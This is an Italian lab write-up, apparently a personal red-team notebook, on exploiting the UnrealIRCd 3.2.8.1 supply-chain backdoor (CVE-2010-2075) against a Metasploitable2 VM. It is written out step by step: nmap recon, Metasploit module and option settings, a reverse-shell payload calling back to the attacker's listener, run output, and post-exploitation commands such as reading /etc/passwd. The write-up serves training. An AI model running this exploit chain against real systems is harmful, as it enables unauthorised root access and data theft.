# 03 — Exploitation: UnrealIRCd 3.2.8.1 Backdoor

## Categoria
Red Team / Exploitation / Metasploit Framework / Supply Chain Attack

## Obiettivo
Sfruttare la backdoor inserita nel sorgente di UnrealIRCd 3.2.8.1
per ottenere una shell root sul target tramite Metasploit.

## Background — CVE-2010-2075

Tra novembre 2009 e giugno 2010 qualcuno compromise il repository
ufficiale di UnrealIRCd e inserì una backdoor nel file
`Unreal3.2.8.1.tar.gz`. Il trigger: qualsiasi stringa che inizia
con `AB` inviata sulla connessione IRC viene eseguita come comando
di sistema con i privilegi del processo — in Metasploitable, root.

Questo è un caso reale di **supply chain attack**: non la
vulnerabilità di un software, ma la compromissione del canale di
distribuzione. Chi aveva scaricato l'archivio in quel periodo
aveva installato una backdoor senza saperlo.

Fu scoperto il 12 giugno 2010 e rimosso immediatamente.

| Riferimento | Valore |
|---|---|
| CVE | CVE-2010-2075 |
| OSVDB | 65445 |
| Disclosure | 2010-06-12 |
| Rank Metasploit | Excellent |

## Ambiente

| Ruolo | VM | IP | Porta |
|---|---|---|---|
| Attacker | Kali Linux | 10.10.10.100 | 4444 (listener) |
| Target | Metasploitable2 | 10.10.10.101 | 6667 (IRC) |

## Tool
**Metasploit Framework v6.4.126-dev** — preinstallato su Kali.

## Procedura Completa

### 1 — Ricognizione — verifica servizio IRC

```bash
nmap -sV -p 6667 10.10.10.101
```

Output:
```
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
Service Info: Host: irc.Metasploitable.LAN
```

Il servizio è UnrealIRCd, attivo su `irc.Metasploitable.LAN`. ✅

![nmap porta 6667](screenshots/unreal-01-nmap-port-6667.png)

### 2 — Selezione modulo Metasploit

```
msfconsole
msf > search unreal
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(...) > info
```

Output `info` rilevante:
- **Rank:** Excellent
- **Platform:** Unix, Linux
- **Arch:** cmd
- **Privileged:** No (la backdoor eredita i privilegi del processo IRC — root su Metasploitable)
- **Description:** backdoor nel download archive tra nov 2009 e giu 2010

![info modulo](screenshots/unreal-02-msf-info.png)

### 3 — Configurazione opzioni

```
show options
set RHOSTS 10.10.10.101
set LHOST 10.10.10.100
set RPORT 6667
set PAYLOAD cmd/unix/reverse
show options
```

Configurazione finale verificata:

| Opzione | Valore |
|---|---|
| RHOSTS | 10.10.10.101 |
| RPORT | 6667 |
| LHOST | 10.10.10.100 |
| LPORT | 4444 |
| PAYLOAD | cmd/unix/reverse |

![show options configurato](screenshots/unreal-03-msf-options.png)

### 4 — Lancio exploit

```
run
```

Output completo:
```
[*] Started reverse TCP double handler on 10.10.10.100:4444
[*] 10.10.10.101:6667 - Connected to 10.10.10.101:6667...
[*] 10.10.10.101:6667 - Sending IRC backdoor command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo rjj02LGCgTfY2N8P;
[*] Writing to socket A
[*] Writing to socket B
[*] A is input...
[+] Command shell session 1 opened (10.10.10.100:4444 → 10.10.10.101:35598)
```

Il payload `cmd/unix/reverse` usa un **double handler**: apre
due connessioni TCP distinte (socket A e B) per separare stdin
e stdout della shell remota.

![shell root ottenuta](screenshots/unreal-04-shell-root.png)

### 5 — Post-Exploitation

```bash
id
# uid=0(root) gid=0(root)

whoami
# root

uname -a
# Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

hostname
# metasploitable

cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
# [... altri utenti di sistema ...]

netstat -antp
# Tutti i servizi in ascolto: FTP, SSH, Telnet, HTTP, SMB,
# IRC (5030/unrealircd), MySQL, PostgreSQL, VNC, ecc.
# Connessione ESTABLISHED: 10.10.10.101:35598 → 10.10.10.100:4444
```

![post-exploitation completo](screenshots/unreal-05-post-exploitation.png)

## Confronto con gli Exploit Precedenti

| Aspetto | Bindshell 1524 | vsftpd Backdoor | UnrealIRCd Backdoor |
|---|---|---|---|
| Tool | netcat | Metasploit | Metasploit |
| Tipo | Bind shell | Reverse shell | Reverse shell (double) |
| Connessione | Kali → Target | Target → Kali | Target → Kali (x2) |
| Porta target | 1524 | 21 | 6667 |
| Complessità | Minima | Media | Media |
| Tipo vulnerabilità | Misconfiguration | Supply chain | Supply chain |
| CVE | — | — | CVE-2010-2075 |

## Risultato
- Shell root ottenuta ✅
- `id`: uid=0(root) gid=0(root) ✅
- `uname -a`: kernel 2.6.24, i686 ✅
- `/etc/passwd` letto ✅
- `netstat -antp`: mappa completa dei servizi ✅

## Snapshot
- `05-kali-unrealircd-exploit` (Kali)
- `03-meta-post-unrealircd` (Metasploitable)

## Lezioni Imparate
- Un supply chain attack è più insidioso di una vulnerabilità classica:
  il software è "legittimo" ma il canale di distribuzione è compromesso
- `info -d` mostra la descrizione estesa e i riferimenti CVE/OSVDB —
  da leggere sempre prima di lanciare un exploit in un lab documentato
- Il payload `cmd/unix/reverse` usa un double handler (due socket TCP)
  per gestire stdin/stdout separatamente: più stabile su sistemi vecchi
- `netstat -antp` dopo la compromissione è fondamentale: rivela tutti
  i servizi in ascolto, le connessioni attive (inclusa la nostra), e
  i PID dei processi — informazioni preziose per il pivot
- La connessione ESTABLISHED nel netstat (10.10.10.101 → 10.10.10.100:4444)
  è la nostra reverse shell — visibile a qualsiasi Blue Team che monitora
